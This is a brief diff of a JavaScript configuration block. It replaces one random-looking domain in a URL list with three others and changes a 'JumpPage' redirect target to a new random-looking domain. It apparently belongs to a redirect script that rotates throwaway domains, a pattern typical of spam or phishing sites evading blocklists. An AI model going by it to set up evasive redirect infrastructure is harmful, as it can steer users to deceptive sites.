@@ -37,10 +37,12 @@ var emails = [
 ];
 
 var urls=[
-	'unqgilop.xyz',
+	'kksfosdn.me',
+        'nxzlfxy.cc',
+        'deiltwl.net',
 ];
                                                                                                                   
-var JumpPage="https://xlgvw.com";
+var JumpPage="https://kwftpliv.com";
 
 var newestUrls = [];
 
